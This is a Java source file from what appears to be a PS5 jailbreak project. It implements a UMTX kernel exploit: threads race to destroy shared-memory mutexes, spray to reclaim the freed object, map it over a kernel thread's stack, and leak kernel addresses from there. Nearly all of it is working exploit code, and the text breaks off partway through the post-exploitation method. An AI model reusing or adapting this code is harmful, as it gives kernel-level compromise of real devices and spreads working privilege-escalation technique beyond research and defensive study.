package org.ps5jb.client.payloads.umtx.impl1;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

import org.ps5jb.client.PayloadConstants;
import org.ps5jb.client.payloads.umtx.common.CommandProcessor;
import org.ps5jb.client.payloads.umtx.common.DebugStatus;
import org.ps5jb.client.payloads.umtx.common.Executor;
import org.ps5jb.client.payloads.umtx.common.KernelAddressClassifier;
import org.ps5jb.client.payloads.umtx.common.KernelOffsetsCalculator;
import org.ps5jb.client.payloads.umtx.common.KernelStabilizer;
import org.ps5jb.client.payloads.umtx.common.KernelStackMarkerOffsets;
import org.ps5jb.client.payloads.umtx.common.KernelAccessorSlow;
import org.ps5jb.client.payloads.umtx.common.LoggingConfiguration;
import org.ps5jb.loader.Status;
import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.sdk.core.SdkException;
import org.ps5jb.sdk.core.SdkRuntimeException;
import org.ps5jb.sdk.core.SdkSoftwareVersionUnsupportedException;
import org.ps5jb.sdk.core.kernel.KernelAccessorIPv6;
import org.ps5jb.sdk.core.kernel.KernelPointer;
import org.ps5jb.loader.KernelReadWrite;
import org.ps5jb.sdk.include.ErrNo;
import org.ps5jb.sdk.include.UniStd;
import org.ps5jb.sdk.include.machine.Param;
import org.ps5jb.sdk.include.sys.CpuSet;
import org.ps5jb.sdk.include.sys.FCntl;
import org.ps5jb.sdk.include.sys.MMan;
import org.ps5jb.sdk.include.sys.Umtx;
import org.ps5jb.sdk.include.sys.errno.BadFileDescriptorException;
import org.ps5jb.sdk.include.sys.errno.InvalidValueException;
import org.ps5jb.sdk.include.sys.errno.NotFoundException;
import org.ps5jb.sdk.include.sys.errno.OutOfMemoryException;
import org.ps5jb.sdk.include.sys.fcntl.OpenFlag;
import org.ps5jb.sdk.include.sys.iovec.IoVecType;
import org.ps5jb.sdk.include.sys.mman.MappingFlag;
import org.ps5jb.sdk.include.sys.mman.ProtectionFlag;
import org.ps5jb.sdk.include.sys.stat.StatType;
import org.ps5jb.sdk.include.sys.timeval.TimevalType;
import org.ps5jb.sdk.include.sys.uio.UioType;
import org.ps5jb.sdk.lib.LibKernel;

public class UmtxExploit implements Runnable {
    State state;

    private static final long KERNEL_STACK_SIZE = Param.ptoa(Param.KSTACK_PAGES);

    private static final long SIZE_PIPEBUF = 24L;

    private final LibKernel libKernel;
    private final ErrNo errNo;
    private final UniStd uniStd;
    private final CpuSet cpuSet;
    private final org.ps5jb.sdk.include.sys.RtPrio rtPrio;
    private final MMan mman;
    private final FCntl fcntl;
    private final Umtx umtx;

    public UmtxExploit() {
        this.libKernel = new LibKernel();
        this.errNo = new ErrNo(this.libKernel);
        this.uniStd = new UniStd(this.libKernel);
        this.cpuSet = new CpuSet(this.libKernel);
        this.rtPrio = new org.ps5jb.sdk.include.sys.RtPrio(this.libKernel);
        this.mman = new MMan(this.libKernel);
        this.fcntl = new FCntl(this.libKernel);
        this.umtx = new Umtx(this.libKernel);

        DebugStatus.level = DebugStatus.Level.INFO;
    }

    //-------------------------------------------------------------------------

    public void run() {
        LoggingConfiguration loggingUi = LoggingConfiguration.createComponent();
        if (!loggingUi.render()) {
            DebugStatus.error("UMTX execution aborted");
            return;
        }

        DebugStatus.error("Running the exploit, it may take 20 seconds or 10 minutes. Please be patient...");

        Runnable mainJob = this::exploit;

        if (Config.toggleMainThreadWait) {
            Executor.runInNewThread("UMTX Exploit", mainJob, (job) -> this.state == null, 4, (short) 767);
        } else {
            mainJob.run();
        }
    }

    public void exploit() {
        this.state = new State();
        try {
            DebugStatus.info("Process ID: " + this.libKernel.getpid());

            if (!prepareExploit()) {
                DebugStatus.error("Preparing for exploitation failed");
                return;
            }
            boolean exploited = false;

            int i;
            for (i = 1; i <= Config.MAX_EXPLOITATION_ATTEMPTS; i++) {
                DebugStatus.error("Exploitation attempt #" + i);

                if (initialExploit()) {
                    DebugStatus.notice("Doing post-exploitation");
                    if (postExploit()) {
                        exploited = true;
                    } else {
                        DebugStatus.notice("Post-exploitation failed");
                    }
                } else {
                    if (DebugStatus.isNoticeEnabled()) {
                        DebugStatus.notice("Exploitation attempt #" + i + " failed");
                    }
                    finishWorkingThreads();
                }

                if (exploited) {
                    break;
                }

                // Force kick of garbage collector.
                System.gc();

                sleep(Config.TINY_WAIT_PERIOD);
            }

            // Terminate the target reclaim thread when done
            if (this.state.targetReclaimJob != null) {
                DebugStatus.info("Terminating reclaim job");

                this.state.targetReclaimJob.getCommandProcessor().cmd.set(CommandProcessor.CMD_EXIT);
                try {
                    this.state.targetReclaimThread.join();
                } catch (InterruptedException e) {
                    // ignore
                }
                this.state.targetReclaimThread = null;
                this.state.targetReclaimJob = null;
                DebugStatus.notice("Reclaim job ended");
            }
        } catch (SdkException | RuntimeException | Error e) {
            Status.printStackTrace(e.getMessage(), e);
            // TODO: Do we need to stop the threads here?
        } finally {
            CheckMemoryPipe.getInstance().free();
            this.state.free();
            this.state = null;
        }

        this.libKernel.closeLibrary();

        DebugStatus.info("Exploit exiting");
    }

    //-------------------------------------------------------------------------

    private boolean prepareExploit() throws SdkException {
        //
        // Prepare scratch buffer and auxiliary things.
        //

        final long scratchBufferSize =
                SIZE_PIPEBUF * 2 +
                0x8L +
                0x8L * Config.MAX_SPRAY_MUTEXES_PER_THREAD * Config.MAX_DESTROYER_THREADS +
                0x8L * Config.MAX_EXTRA_USER_MUTEXES +
                StatType.SIZE +
                TimevalType.SIZE +
                0x8L +
                Config.MAX_RECLAIM_THREAD_NAME_SIZE +
                Config.STATE_SIZE * Config.MAX_RECLAIM_THREADS;

        this.state.scratchBufferAddress = Pointer.calloc(scratchBufferSize);
        this.state.primarySharedMemoryKeyAddress = this.state.scratchBufferAddress.inc(0);
        this.state.secondarySharedMemoryKeyAddress = this.state.primarySharedMemoryKeyAddress.inc(0x8L);
        this.state.extraSharedMemoryKeyAddress = this.state.secondarySharedMemoryKeyAddress.inc(0x8L * Config.MAX_SPRAY_MUTEXES_PER_THREAD * Config.MAX_DESTROYER_THREADS);
        this.state.statAddress = this.state.extraSharedMemoryKeyAddress.inc(0x8L * Config.MAX_EXTRA_USER_MUTEXES);
        this.state.timeoutAddress = new TimevalType(this.state.statAddress.inc(StatType.SIZE));
        this.state.markerPatternAddress = this.state.timeoutAddress.getPointer().inc(TimevalType.SIZE);
        this.state.threadNameAddress = this.state.markerPatternAddress.inc(0x8L);
        this.state.reclaimJobStatesAddress = this.state.threadNameAddress.inc(Config.MAX_RECLAIM_THREAD_NAME_SIZE);

        this.state.raceDoneFlag = new AtomicBoolean();
        this.state.readyFlag = new AtomicBoolean();
        this.state.destroyFlag = new AtomicBoolean();
        this.state.sprayFlag = new AtomicBoolean();
        this.state.checkDoneFlag = new AtomicBoolean();
        this.state.doneFlag = new AtomicBoolean();

        this.state.numReadyThreads = new AtomicInteger();
        this.state.numCompletedThreads = new AtomicInteger();
        this.state.numFinishedThreads = new AtomicInteger();
        this.state.numDestructions = new AtomicInteger();
        this.state.numSprays = new AtomicInteger();

        this.state.initialOriginalDescriptor = -1;
        this.state.originalDescriptor = -1;
        this.state.lookupDescriptor = -1;
        this.state.winnerDescriptor = -1;

        this.state.reclaimDescriptors = new int[Config.MAX_DESTROYER_THREADS * Config.MAX_SPRAY_MUTEXES_PER_THREAD];
        Arrays.fill(this.state.reclaimDescriptors, -1);

        this.state.extraDescriptors = new int[Config.MAX_EXTRA_USER_MUTEXES];
        Arrays.fill(this.state.extraDescriptors, -1);

        this.state.destroyerThreadIndex = -1;

        this.state.usedDescriptors = new HashSet();

        this.state.mappedKernelStackAddresses = new HashSet();
        this.state.mappedReclaimKernelStackAddress = Pointer.NULL;

        this.state.initialMainThreadAffinity = this.cpuSet.getCurrentThreadAffinity();

        this.state.markerPatternAddress.write4(Config.RECLAIM_THREAD_MARKER_BASE);

        //
        // Prepare dummy shared memory objects (if needed).
        //

        final int[] dummyDescriptors = new int[Config.MAX_DUMMY_SHARED_MEMORY_OBJECTS];

        final long mappedSize = KERNEL_STACK_SIZE;

        for (int i = 0; i < dummyDescriptors.length; i++) {
            DebugStatus.debug("Creating dummy shared memory object #" + i);
            int descriptor = this.mman.sharedMemoryOpenAnonymous(438 /* 0666 */, OpenFlag.O_RDWR, OpenFlag.O_CREAT);
            DebugStatus.debug("Descriptor of dummy shared memory object #" + i + ": " + descriptor);

            DebugStatus.debug("Truncating dummy shared memory object #" + i);
            this.uniStd.ftruncate(descriptor, mappedSize);
            DebugStatus.debug("Mapping memory of dummy shared memory object #" + i);
            final Pointer address = this.mman.memoryMap(Pointer.NULL, mappedSize,
                    new ProtectionFlag[] { ProtectionFlag.PROT_READ, ProtectionFlag.PROT_WRITE },
                    new MappingFlag[] { MappingFlag.MAP_SHARED },
                    descriptor, 0);
            if (!address.equals(Pointer.NULL)) {
                DebugStatus.debug("Touching dummy shared memory object #" + i + " at " + address);
                address.write4(i);

                dummyDescriptors[i] = descriptor;
                descriptor = -1;

                DebugStatus.debug("Unmapping memory of dummy shared memory object #" + i);
                this.mman.memoryUnmap(address, mappedSize);
            } else {
                DebugStatus.error("Mapping memory of dummy shared memory object #" + i + " failed");
            }

            if (descriptor != -1) {
                DebugStatus.debug("Closing descriptor #" + descriptor + " of dummy shared memory object #" + i);
                this.fcntl.close(descriptor);
                dummyDescriptors[i] = -1;
            }
        }

        for (int i = 0; i < dummyDescriptors.length; i++) {
            final int descriptor = dummyDescriptors[i];
            if (descriptor == -1) {
                continue;
            }

            DebugStatus.debug("Closing descriptor #" + descriptor + " of dummy shared memory object #" + i);
            this.fcntl.close(descriptor);
            dummyDescriptors[i] = -1;
        }

        //
        // Initial set up of threads.
        //

        this.state.destroyerThreads = new ArrayList();

        this.state.reclaimJobs = new ArrayList();
        this.state.reclaimThreads = new ArrayList();

        // Set moderate timeout to avoid locks (struct timeval).
        this.state.timeoutAddress.setSec(0);
        this.state.timeoutAddress.setUsec(500000); // 0.5 seconds = 500000 microseconds

        this.cpuSet.setCurrentThreadAffinity(this.state.MAIN_THREAD_CORES);

        if (Config.toggleSetThreadPriorities) {
            rtPrio.setRtPrio(0, Config.MAIN_THREAD_PRIORITY);
        }

        return true;
    }

    private void resetState() {
        this.state.raceDoneFlag.set(false);
        this.state.readyFlag.set(false);
        this.state.destroyFlag.set(false);
        this.state.sprayFlag.set(false);
        this.state.checkDoneFlag.set(false);
        this.state.doneFlag.set(false);

        this.state.numReadyThreads.set(0);
        this.state.numCompletedThreads.set(0);
        this.state.numFinishedThreads.set(0);
        this.state.numDestructions.set(0);
        this.state.numSprays.set(0);

        this.state.originalDescriptor = -1;
        this.state.lookupDescriptor = -1;
        this.state.winnerDescriptor = -1;

        Arrays.fill(this.state.reclaimDescriptors, -1);
        Arrays.fill(this.state.extraDescriptors, -1);

        this.state.destroyerThreadIndex = -1;
    }

    private void cleanupState() {
        for (int i = 0; i < this.state.reclaimDescriptors.length; i++) {
            final int descriptor = this.state.reclaimDescriptors[i];
            if (descriptor == -1) {
                continue;
            }

            DebugStatus.debug("Closing descriptor #" + descriptor + " of reclaim shared memory object #" + i);
            try {
                this.fcntl.close(descriptor);
            } catch (SdkException e) {
                DebugStatus.error("Failed to close descriptor #" + descriptor);
            }
            this.state.reclaimDescriptors[i] = -1;
        }

        if (this.state.lookupDescriptor != -1 && !this.state.usedDescriptors.contains(new Integer(this.state.lookupDescriptor))) {
            DebugStatus.debug("Closing lookup descriptor #" + this.state.lookupDescriptor + " of primary shared memory object");
            try {
                this.fcntl.close(this.state.lookupDescriptor);
            } catch (SdkException e) {
                DebugStatus.error("Failed to close lookup descriptor #" + this.state.lookupDescriptor);
            }
            this.state.lookupDescriptor = -1;
        }

        DebugStatus.debug("Attempting to destroy secondary user mutexes");
        for (int i = 0; i < Config.MAX_DESTROYER_THREADS * Config.MAX_SPRAY_MUTEXES_PER_THREAD; ++i) {
            try {
                this.umtx.userMutexDestroy(this.state.secondarySharedMemoryKeyAddress.inc(i * 0x8L));
            } catch (NotFoundException e) {
                // Expected
            } catch (SdkException e) {
                DebugStatus.error("Failed to destroy secondary user mutex " + i, e);
            }
        }

        DebugStatus.debug("Attempting to destroy primary user mutex");
        try {
            this.umtx.userMutexDestroy(this.state.primarySharedMemoryKeyAddress);
        } catch (NotFoundException e) {
            // Expected
        } catch (SdkException e) {
            DebugStatus.error("Failed to destroy primary user mutex", e);
        }

        for (int i = 0; i < this.state.extraDescriptors.length; i++) {
            final int descriptor = this.state.extraDescriptors[i];
            if (descriptor == -1) {
                continue;
            }

            try {
                this.umtx.userMutexDestroy(this.state.extraSharedMemoryKeyAddress.inc(i * 0x8L));
            } catch (SdkException e) {
                DebugStatus.error("Failed to destroy extra shm " + this.state.extraSharedMemoryKeyAddress.inc(i * 0x8L));
            }

            DebugStatus.debug("Closing extra descriptor #" + descriptor);
            try {
                this.fcntl.close(descriptor);
            } catch (SdkException e) {
                DebugStatus.error("Failed to close extra descriptor #" + descriptor);
            }
            this.state.extraDescriptors[i] = -1;
        }
    }

    private int checkForCorruption() throws SdkException {
        if (this.state.originalDescriptor == -1) {
            DebugStatus.error("Original descriptor of primary shared memory object not found");
            return -1;
        }
        DebugStatus.notice("Original descriptor of primary shared memory object: " + this.state.originalDescriptor);

        if (this.state.lookupDescriptor == -1) {
            DebugStatus.notice("Lookup descriptor of primary shared memory object not found");
            return -1;
        }
        DebugStatus.notice("Lookup descriptor of primary shared memory object: " + this.state.lookupDescriptor);

        final long size = getFileSize(this.state.lookupDescriptor);
        DebugStatus.debug("Size of primary shared memory object: 0x" + Long.toHexString(size));

        final int descriptor = (int) Param.atop(size);
        if (descriptor > Config.MAX_DESCRIPTORS) {
            DebugStatus.error("Calculated descriptor is too large: #" + descriptor);
            return -1;
        }
        DebugStatus.notice("Calculated descriptor #" + descriptor);

        if (descriptor != this.state.originalDescriptor && descriptor != this.state.lookupDescriptor) {
            DebugStatus.info("Got mismatch of descriptors!");
            return descriptor;
        }

        return -1;
    }

    private boolean checkMemoryAccess(Pointer ptr) {
        return CheckMemoryPipe.getInstance().checkMemoryAccessible(ptr);
    }

    private long getFileSize(int fd) throws SdkException {
        // TODO: Too lazy to create a wrapper for it
        int ret = this.libKernel.fstat(fd, this.state.statAddress);
        if (ret == -1) {
            throw this.errNo.getLastException(libKernel.getClass(), "fstat");
        }
        return this.state.statAddress.read8(StatType.OFFSET_ST_SIZE);
    }

    void sleep(long millis) {
        try {
            Thread.sleep(millis);
        } catch (InterruptedException e) {
            // Ignore
        }
    }

    void thread_yield() {
        Thread.yield();
    }

    private boolean initialExploit() throws SdkException {
        this.state.stackDataBuffer = null;

        resetState();

        //
        // Prepare destroyer, lookup and reclaim threads.
        //

        DebugStatus.notice("Creating destroyer threads");
        for (int i = 0; i < Config.MAX_DESTROYER_THREADS; i++) {
            DebugStatus.trace("Creating destroyer thread #" + i);
            final DestroyerJob destroyerJob = new DestroyerJob(i, this.state);
            final Thread thread = new Thread(destroyerJob, destroyerJob.getJobName());
            this.state.destroyerThreads.add(thread);
        }

        DebugStatus.notice("Creating lookup thread");
        final LookupJob lookupJob = new LookupJob(this.state);
        this.state.lookupThread = new Thread(lookupJob, lookupJob.getJobName());

        for (int i = 0; i < Config.MAX_DESTROYER_THREADS; i++) {
            final Thread thread = (Thread) this.state.destroyerThreads.get(i);

            DebugStatus.trace("Starting destroyer thread #" + i);
            thread.start();
        }

        DebugStatus.debug("Starting lookup thread");
        this.state.lookupThread.start();

        DebugStatus.debug("Creating reclaim threads");
        for (int i = 0; i < Config.MAX_RECLAIM_THREADS; i++) {
            DebugStatus.trace("Creating reclaim thread #" + i);
            final ReclaimJob reclaimJob = new ReclaimJob(i, this.state);
            this.state.reclaimJobs.add(reclaimJob);
            final Thread thread = new Thread(reclaimJob, reclaimJob.getJobName());
            this.state.reclaimThreads.add(thread);
        }

        sleep(Config.INITIAL_WAIT_PERIOD);

        //
        // Initial exploitation that does memory corruption.
        //

        DebugStatus.notice("Resetting state");
        resetState();

        int numIterations = 0;
        boolean isLastIteration = false;

        while (!this.state.raceDoneFlag.get() && !isLastIteration) {
            numIterations++;
            isLastIteration = numIterations >= Config.MAX_RACING_ITERATIONS;
            if (numIterations % 200 == 0) {
                DebugStatus.error("Racing iteration #" + numIterations);
            }

            DebugStatus.debug("Starting loop");

            DebugStatus.debug("Creating primary user mutex");
            int descriptor = this.umtx.userMutexCreate(this.state.primarySharedMemoryKeyAddress);

            DebugStatus.notice("Original descriptor of primary shared memory object: " + descriptor);
            this.state.originalDescriptor = descriptor;

            if (this.state.initialOriginalDescriptor == -1) {
                this.state.initialOriginalDescriptor = descriptor;
            }

            // Set size of primary shared memory object, so we can find its descriptor later (see comments for `MAGIC_NUMBER`).
            DebugStatus.debug("Truncating primary shared memory object");
            truncateSharedMemorySpecial(descriptor);

            // Close this descriptor to decrement reference counter of primary shared memory object.
            DebugStatus.debug("Closing original descriptor #" + descriptor + " of primary shared memory object");
            this.fcntl.close(descriptor);

            DebugStatus.notice("We are ready to start");

            // Notify other threads that we are ready to start.
            this.state.readyFlag.set(true);

            // Wait for other threads to be ready.
            waitForCounter(this.state.numReadyThreads, Config.MAX_DESTROYER_THREADS + 1, " threads to be ready"); // Plus one for lookup thread

            // Clear `ready` flag, thus no other thread will start its loop again prematurely.
            this.state.readyFlag.set(false);

            // Reset `ready` counter to reuse it during cleaning step.
            this.state.numReadyThreads.set(0);

            // Notify destroyer threads that they should attempt to destroy primary shared memory object.
            this.state.destroyFlag.set(true);

            // Wait until other threads will do their main job.
            waitForCounter(this.state.numCompletedThreads, Config.MAX_DESTROYER_THREADS + 1, " threads to be completed"); // Plus one for lookup thread

            final int count = this.state.numDestructions.get();
            DebugStatus.notice("Number of successful destructions: " + count);

            // Notify about spray phase
            this.state.sprayFlag.set(true);

            if (Config.toggleSprayOnDestroyThread) {
                // Wait until destroyers finish spraying
                waitForCounter(this.state.numSprays, Config.MAX_DESTROYER_THREADS, " threads to finish spraying");
            } else if (count >= Config.MAX_DESTROYER_THREADS) {
                DebugStatus.notice("Spraying and praying");

                for (int i = 0; i < this.state.reclaimDescriptors.length; i++) {
                    DebugStatus.debug("Switching to destroyer thread #" + (i % Config.MAX_DESTROYER_THREADS) + " core");
                    cpuSet.setCurrentThreadAffinity(this.state.DESTROYER_THREAD_CORES[i % Config.MAX_DESTROYER_THREADS]);

                    DebugStatus.debug("Creating secondary user mutex #" + i);
                    descriptor = this.umtx.userMutexCreate(this.state.secondarySharedMemoryKeyAddress.inc(0x8L * i));

                    DebugStatus.debug("Descriptor of secondary shared memory object #" + i + ": " + descriptor);
                    this.state.reclaimDescriptors[i] = descriptor;

                    DebugStatus.debug("Truncating secondary shared memory object #" + i);
                    truncateSharedMemorySpecial(descriptor);

                    DebugStatus.debug("Destroying secondary user mutex #" + i);
                    this.umtx.userMutexDestroy(this.state.secondarySharedMemoryKeyAddress.inc(0x8L * i));
                }

                DebugStatus.debug("Switching to initial core");
                cpuSet.setCurrentThreadAffinity(this.state.MAIN_THREAD_CORES);

                DebugStatus.notice("Spraying done");
            }

            DebugStatus.notice("Checking for shared memory object corruption");
            descriptor = checkForCorruption();
            if (descriptor != -1) {
                DebugStatus.info("Checking succeeded, winner descriptor of shared memory object: " + descriptor);
                this.state.winnerDescriptor = descriptor;
            } else {
                DebugStatus.notice("Checking failed");
            }

            if (this.state.lookupDescriptor != -1 && this.state.numDestructions.get() >= Config.MAX_DESTROYER_THREADS) {
                // Don't close lookup descriptor right away when it is possibly corrupted
                this.state.usedDescriptors.add(new Integer(this.state.lookupDescriptor));
            }

            for (int i = 0; i < this.state.reclaimDescriptors.length; i++) {
                descriptor = this.state.reclaimDescriptors[i];
                if (descriptor == -1) {
                    continue;
                }

                if (this.state.winnerDescriptor != -1 && this.state.winnerDescriptor == descriptor) {
                    // We do not need to close it, so just reset descriptor.
                    this.state.destroyerThreadIndex = i % Config.MAX_DESTROYER_THREADS;
                } else {
                    DebugStatus.debug("Closing descriptor #" + descriptor + " of reclaim shared memory object #" + i);
                    this.fcntl.close(descriptor);
                    this.state.reclaimDescriptors[i] = -1;
                }
            }

            // Notify all threads that they should not be destroyed yet.
            this.state.destroyFlag.set(false);

            // Notify other threads that check was done.
            this.state.checkDoneFlag.set(true);

            if (count == Config.MAX_DESTROYER_THREADS && this.state.winnerDescriptor != -1) {
                if (DebugStatus.isNoticeEnabled()) {
                    // Set new size of primary shared memory object to match kernel stack size and see that it affects both
                    DebugStatus.notice("Truncating shared memory object with descriptor #" + this.state.winnerDescriptor);
                    this.uniStd.ftruncate(this.state.winnerDescriptor, KERNEL_STACK_SIZE);

                    final long lookupSize = getFileSize(this.state.lookupDescriptor);
                    DebugStatus.notice("Size of shared memory object with lookup descriptor #" + this.state.lookupDescriptor + ": 0x" + Long.toHexString(lookupSize));

                    final long winnerSize = getFileSize(this.state.winnerDescriptor);
                    DebugStatus.notice("Size of shared memory object with winner descriptor #" + this.state.winnerDescriptor + ": 0x" + Long.toHexString(winnerSize));
                }

                DebugStatus.info("We have some result from destroyer #" + this.state.destroyerThreadIndex + "!!!");

                // Notify other threads that racing succeeded.
                this.state.raceDoneFlag.set(true);
            } else if (isLastIteration) {
                // Notify other threads that we are done racing for good.
                this.state.raceDoneFlag.set(true);
            }

            // Wait until other threads will be ready to finish.
            waitForCounter(this.state.numReadyThreads, Config.MAX_DESTROYER_THREADS + 1, " threads to be ready for finish"); // Plus one for lookup thread

            // Notify other threads that we are done.
            this.state.doneFlag.set(true);

            // Wait until other threads will be finished.
            waitForCounter(this.state.numFinishedThreads, Config.MAX_DESTROYER_THREADS + 1, " threads to be finished"); // Plus one for lookup thread

            // Reset everything if we did not find proper descriptor.
            if (this.state.winnerDescriptor == -1) {
                DebugStatus.debug("Cleaning up state");
                cleanupState();

                if (!isLastIteration) {
                    DebugStatus.debug("Resetting state");
                    resetState();
                }
            }

            DebugStatus.debug("Finishing loop");
        }

        // Recover initial CPU affinity mask for main thread.
        DebugStatus.notice("Recovering initial CPU affinity mask for main thread");
        cpuSet.setCurrentThreadAffinity(this.state.initialMainThreadAffinity);

        final boolean gotResult = this.state.winnerDescriptor != -1;

        // Notify other threads that we are done.
        this.state.raceDoneFlag.set(true);

        if (gotResult) {
            DebugStatus.notice("Original descriptor of primary shared memory object: " + this.state.originalDescriptor);
            DebugStatus.notice("Winner descriptor of primary shared memory object: " + this.state.winnerDescriptor);

            if (this.state.lookupDescriptor == -1) {
                DebugStatus.notice("Racing done but lookup descriptor not found");
            } else {
                DebugStatus.notice("Lookup descriptor of primary shared memory object: " + this.state.lookupDescriptor);
            }

            DebugStatus.info("Got memory corruption after " + numIterations + " iterations");
        } else {
            DebugStatus.info("No memory corruption even after " + numIterations + " iterations");
        }

        return gotResult;
    }

    private void finishWorkingThreads() {
        // Finish all working threads, thus only reclaim threads will be running.
        this.state.destroyFlag.set(true);

        // Give other threads some time to finish.
        sleep(Config.TINY_WAIT_PERIOD);

        if (this.state.lookupThread != null) {
            DebugStatus.trace("Joining lookup thread");
            try {
                this.state.lookupThread.join();
            } catch (InterruptedException e) {
                // ignore
            }

            DebugStatus.notice("Unsetting lookup thread");
            this.state.lookupThread = null;
        }

        if (!this.state.destroyerThreads.isEmpty()) {
            DebugStatus.notice("Joining destroyer threads");
            for (int i = 0; i < this.state.destroyerThreads.size(); i++) {
                final Thread thread = (Thread) this.state.destroyerThreads.get(i);

                DebugStatus.trace("Joining destroyer thread #" + i);
                try {
                    thread.join();
                } catch (InterruptedException e) {
                    // ignore
                }
            }

            DebugStatus.notice("Clearing destroyer thread list");
            this.state.destroyerThreads.clear();
        }
    }

    private boolean postExploit() throws SdkException {
        if (this.state.destroyerThreadIndex == -1) {
            DebugStatus.error("No destroyer thread index found");
            return false;
        }

        if (Config.toggleStoppingWorkingThreadsBeforeRemap) {
            finishWorkingThreads();
        }

        for (int i = 0; i < this.state.extraDescriptors.length; i++) {
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("Creating extra user mutex #" + i);
            }
            this.state.extraDescriptors[i] = this.umtx.userMutexCreate(this.state.extraSharedMemoryKeyAddress.inc(i * 0x8L));
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("Descriptor of extra shared memory object #" + i + ": " + this.state.extraDescriptors[i]);
            }
        }

        // Free primary shared memory object.
        if (this.state.winnerDescriptor != -1) {
            DebugStatus.notice("Closing winner descriptor #" + this.state.winnerDescriptor + " of primary shared memory object");
            this.fcntl.close(this.state.winnerDescriptor);
            this.state.winnerDescriptor = -1;
        }

        // Map memory of freed primary shared memory object.
        DebugStatus.notice("Mapping memory of shared memory object with lookup descriptor #" + this.state.lookupDescriptor);
        Pointer mappedKernelStackAddress = this.mman.memoryMap(Pointer.NULL, KERNEL_STACK_SIZE,
                new ProtectionFlag[] { ProtectionFlag.PROT_NONE }, new MappingFlag[] { MappingFlag.MAP_SHARED },
                this.state.lookupDescriptor, 0);
        DebugStatus.info("Mapped address of potential kernel stack: " + mappedKernelStackAddress + ". Size: 0x" + Long.toHexString(KERNEL_STACK_SIZE));
        this.state.mappedKernelStackAddresses.add(mappedKernelStackAddress);

        DebugStatus.notice("Protecting mapped memory of potential kernel stack");
        try {
            this.mman.memoryProtect(mappedKernelStackAddress, KERNEL_STACK_SIZE, ProtectionFlag.PROT_READ, ProtectionFlag.PROT_WRITE);
        } catch (SdkException | SdkRuntimeException e) {
            DebugStatus.error("Protecting mapped memory of potential kernel stack failed");
            if (Config.toggleUnmappingOnFailure) {
                this.mman.memoryUnmap(mappedKernelStackAddress, KERNEL_STACK_SIZE);
            }

            mappedKernelStackAddress = Pointer.NULL;
        }

        long markerOffset = -1L;
        KernelAddressClassifier classifier = null;

        if (!Pointer.NULL.equals(mappedKernelStackAddress)) {
            // We need to observe kernel stack before destroying any running threads.
            this.state.destroyFlag.set(false);

            final long scanSize = Param.PHYS_PAGE_SIZE;
            final Pointer scanAddress = mappedKernelStackAddress.inc(KERNEL_STACK_SIZE - scanSize);

            this.state.stackDataBuffer = new MemoryBuffer(scanAddress, scanSize - 0x20);

            DebugStatus.info("Starting " + Config.MAX_RECLAIM_THREADS + " reclaim threads");

            // Start reclaim threads to occupy freed shared memory object with virtual memory object of one of theirs kernel stack.
            for (int i = 0; i < Config.MAX_RECLAIM_THREADS; i++) {
                final Thread thread = (Thread) this.state.reclaimThreads.get(i);

                DebugStatus.trace("Starting reclaim thread #" + i);
                thread.start();
            }

            DebugStatus.notice("Reclaim threads started");

            // There could be a problem when threads are created, address of freed shared memory object
            // can be reused (initialized with zeros). See: sys_thr_new -> kern_thr_new -> thread_create -> kern_thr_alloc

            // Kick all reclaim threads at once, thus they could start real execution at same time.
            this.state.readyFlag.set(true);

            DebugStatus.info("Checking if reclaimed memory belongs to controlled thread");

            // XXX: Need to be careful with logging here because it may cause reliability problems.

            boolean accessChecked = false;

            for (int i = 0; i < Config.MAX_SEARCH_LOOP_INVOCATIONS; i++) {
                // Give some execution time to reclaimed threads.
                sleep(Config.KERNEL_STACK_WAIT_PERIOD);

                if (!accessChecked) {
                    // Mapped memory region could be not readable, check that.
                    if (!checkMemoryAccess(mappedKernelStackAddress)) {
                        DebugStatus.error("Reclaimed memory access check failed.");

                        if (Config.toggleUnmappingOnFailure) {
                            DebugStatus.notice("Unmapping memory of potential kernel stack: " + mappedKernelStackAddress);
                            try {
                                this.mman.memoryUnmap(mappedKernelStackAddress, KERNEL_STACK_SIZE);
                            } catch (SdkException e) {
                                DebugStatus.error("Unmapping of potential kernel stack memory failed.", e);
                            }
                        }

                        mappedKernelStackAddress = Pointer.NULL;

                        break;
                    }

                    accessChecked = true;
                }

                if (Config.dumpKernelStackPartially && (i == 0)) {
                    final long count = this.state.stackDataBuffer.getSize() / 8;
                    boolean allZeros = true;

                    for (int j = 0; j < count; j++) {
                        final long value = this.state.stackDataBuffer.read64(j * 8L);
                        if (value != 0L) {
                            DebugStatus.notice("Found some kernel stack data at 0x" + Long.toHexString(j * 8L) + ": 0x" + Long.toHexString(value));
                            allZeros = false;
                            break;
                        }
                    }

                    if (!allZeros) {
                        DebugStatus.info("Initial leaked kernel stack data");
                        this.state.stackDataBuffer.dump();
                    }
                    else {
                        DebugStatus.notice("Kernel stack is all zeroes");
                    }
                }

                markerOffset = this.state.stackDataBuffer.find(this.state.markerPatternAddress, 0x2);
                if (markerOffset != -1L) {
                    DebugStatus.info("Found marker pattern in kernel stack at 0x" + Long.toHexString(markerOffset));

                    if (Config.dumpKernelStackOfReclaimThread || (Config.dumpKernelStackPartially && (i != 0))) {
                        DebugStatus.info("Final leaked kernel stack data:");
                        this.state.stackDataBuffer.dump();
                    }

                    DebugStatus.notice("Classifying leaked kernel addresses");

                    classifier = KernelAddressClassifier.fromBuffer(new Pointer(this.state.stackDataBuffer.getAddr(), new Long(this.state.stackDataBuffer.getSize())));

                    // Get last byte of pattern and convert it to reclaim job index.
                    final int reclaimMarkerWord = this.state.stackDataBuffer.read16(markerOffset + 2) & 0xFFFF;
                    final int reclaimJobIndex = (reclaimMarkerWord - 0x41) - 1;
                    DebugStatus.info("Determined reclaim job index: " + reclaimJobIndex);

                    if (reclaimJobIndex >= 0 && reclaimJobIndex < Config.MAX_RECLAIM_THREADS) {
                        final ReclaimJob job = (ReclaimJob) this.state.reclaimJobs.get(reclaimJobIndex);
                        final String jobName = job.getJobName();

                        DebugStatus.info("Found reclaim thread '" + jobName + "' using " + (i + 1) + " attempts");
                        this.state.stackDataBuffer.snapshot();

                        this.state.mappedReclaimKernelStackAddress = mappedKernelStackAddress;

                        job.setTarget(true);

                        break;
                    } else {
                        DebugStatus.notice("Job index is bad, continuing checking");
                    }
                }
            }

